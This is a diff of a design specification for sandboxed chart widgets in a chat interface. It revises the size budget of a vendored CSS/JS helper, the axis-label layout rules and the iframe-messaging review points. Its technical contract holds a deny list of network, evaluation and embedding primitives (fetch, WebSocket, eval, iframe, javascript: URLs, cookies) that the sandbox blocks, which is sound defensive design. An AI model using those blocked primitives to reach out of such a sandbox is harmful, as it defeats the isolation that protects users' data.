 - Body text 13px; captions 12px var(--lo-ink-muted); axis text 12px. Must work from the 220px canvas-open column to 900px wide: no fixed widths, use viewBox SVG (LO helpers redraw on width changes).
 - Pass `title` and `unit`: the helper prints both visibly (a title line; the unit on the top axis tick). An unlabelled chart is a rendering bug.
 - Keep height content-sized, under ~480px; split rather than scroll.
-- No animation, transitions, or external fonts. Values stay readable without hover — tooltips are enhancement only (relay/native have no hover).
+- No animation, transitions, or external fonts. Values stay readable without hover — tooltips are enhancement only (relay/native have no hover). **Accepted loss (round-2 D2-4):** where a label is still truncated on a no-hover surface, the full text is unreachable there — the axis titles and the data's own precision carry the meaning, and the fixture set (App. C) shows the worst case rather than assuming it away.
 
 TECHNICAL CONTRACT
 - No network, no storage, no navigation: never use fetch, XMLHttpRequest, WebSocket, import(), eval, Function, <form>, <iframe>, <object>, <embed>, <base>, <link>, <meta>, external src/href, javascript: URLs, window.open, localStorage, cookies. They are blocked and the component is discarded.
@@ -1481,7 +1545,8 @@ A steer adds `<instruction>{user text, ≤ 500 chars}</instruction>` after the e
     settings, the projects timeline, and the analytics panel, which presents as a dialog
     *over* the chat — none renders beside the transcript. Should a surface ever show both,
     **guard slot 1**: if ΔE76(accent, `--s1`) < 20, series 1 uses the farthest slot. The
-    guard is measured at ≈ +430 B gzip (three colour-space helpers + the swap), over the
+    guard is measured at **+412 B gzip** with the size method §2.6 pins (the spike's
+    `measure.py`, 2026-10-09 — the earlier "≈ +430 / +434" pair mixed two methods, D2-3), over the
     pinned prelude budget, so it is deliberately not in the v1 build — it lands with the
     surface that needs it, under the size test;
   - the adjacency measurement for the record: **25 of 59** UI themes have a slot within
@@ -1491,22 +1556,35 @@ A steer adds `<instruction>{user text, ≤ 500 chars}</instruction>` after the e
 ## Appendix C — the vendored prelude (spike)
 
 - A working spike of `prelude.css` + `prelude.js` — the **minified build** (sources as
-  `prelude.src.*`, a `BUILD.md` with the rebuild command) — exists in the architect
+  `prelude.src.*`, a `BUILD.md` with the rebuild command and the measurement method, plus
+  `measure.py` which re-derives every size figure) — exists in the architect
   scratchpad and is attached to the C0 PR as the starting point; the round-1 remediation
-  above is folded in.
-- **Size:** 2,045 B CSS + 7,089 B JS raw (minified build); **4,067 B gzip** for both
-  (`gzip -9`). Budget: ≤ 10 KB raw / ≤ 4 KB gzip, enforced by a unit test — 29 B of gzip
-  headroom; any addition re-measures.
+  **and the round-2 label-layout fix** are folded in.
+- **Size:** 2,044 B CSS + 8,180 B JS raw (minified build, esbuild 0.28.2); **4,538 B gzip** for
+  both (`cat` the pair through `gzip -9` — one method for the budget, the guard's cost and every
+  figure here). Budget: **≤ 11 KB raw / ≤ 4.5 KB gzip**, enforced by a unit test — 1,040 B and
+  70 B spare; round 2 moved both caps because D2-1/D2-2/D2-4's fix cost +474 B gzip / +1,089 B
+  raw against the pre-fix pair through the same tool (§2.6). Any addition re-measures and, at
+  this margin, trims.
 - It provides:
   - `LO.data` (frozen, from `<script type="application/json" id="lo-data">`);
   - `LO.ds/col/fmt/color/el/onTheme/onSize`;
   - `LO.table` (right-aligned tabular numerals, horizontal scroll at 320 px, title line,
     source-precision cells);
   - `LO.bar` (vertical/horizontal, grouped, zero baseline, direct value labels at source
-    precision, category-label step-thinning and 12-char truncation with the full text in a
-    `<title>`, unit on the top axis tick);
+    precision, category-label step-thinning, truncate-only-when-the-slot-requires-it with the
+    full text in a `<title>`, unit on the top axis tick);
   - `LO.line` (numeric or categorical x, tick thinning by width, dash patterns per series,
     end labels, unit on the top tick);
+  - **the axis-label rule (round-2 D2-1/D2-2/D2-4, in both helpers):** the left margin
+    *reserves* the measured width of the widest left-anchored tick label — the top one carries
+    the unit, so a fixed 48 px margin painted `150 req/s` as `50 req/s` — plus a 10 px gap to
+    the plot; when that reservation would take more than 40 % of a narrow frame the top tick is
+    drawn inside the plot above the top gridline instead, and never clipped. A category label
+    is truncated only when its slot cannot hold it, and one that still cannot clear its drawn
+    neighbour by 8 px is dropped, not overlapped. The horizontal bar's tick label is clamped
+    into the plot and its right margin reserves the widest value label. The measuring helpers
+    (`_tw`/`_fit`/`_cl`) stay closure-private; the documented surface on `LO` is unchanged;
   - `LO.size` (rAF-coalesced `resize` post) and the **width-change redraw**: a
     `ResizeObserver` on the root re-runs mounted helpers (rAF-coalesced) on a width change;
     raw components get `LO.onSize(fn)`; layout floor is the 220 px column (216 px inner),
@@ -1515,7 +1593,8 @@ A steer adds `<instruction>{user text, ≤ 500 chars}</instruction>` after the e
     `^--(lo|font)-[a-z0-9-]+$`, 120-char cap, **CSSOM application gated by `CSS.supports`**,
     `data-mode`, `color-scheme` follows the mode, hidden until the first theme or the 400 ms
     fallback as a last resort);
-  - a window `error` → `{t:"error"}` post.
+  - a window `error` → `{t:"error"}` post, and the **liveness answer**: `{t:"ping"}` →
+    `{t:"pong"}` on the §4.1 wire (one outstanding at a time, never coalesced; round-2 S-R2-5).
 - It makes no network calls, does no storage, and posts `parent` only through the one `P()`
   function.
 - **Review points the C0 reviewer should check:**
@@ -1524,8 +1603,11 @@ A steer adds `<instruction>{user text, ≤ 500 chars}</instruction>` after the e
     cannot be named — and the receiving side does **not** rest on it: the parent validates
     `event.source`, the per-frame nonce (never carried in the URL), and drops messages from
     any frame whose navigation counter moved (round-1 S-R4);
-  - the rendered fixture shows the title line and the unit (D2), thinned/truncated labels at
-    320 px (D5), and source-precision values (D4); `isSecureContext`/`RTCPeerConnection` are
+  - the rendered fixture shows the title line and the unit (D2), the **unit-swap pair** on
+    identical data (`req/s` → the top tick no longer clips; D2-1) and the six-long-category
+    collision fixture at 300 and 220 px (D2-2) — labels truncated only where the slot requires
+    it (D2-4) — plus source-precision values (D4) at 620 px;
+    `isSecureContext`/`RTCPeerConnection` are
     recorded for whichever delivery P1 selects (round-1 S-R9);
   - the size test pins the **minified build** (the vendored pair); rebuild with
     `esbuild --minify` per the spike's `BUILD.md`.
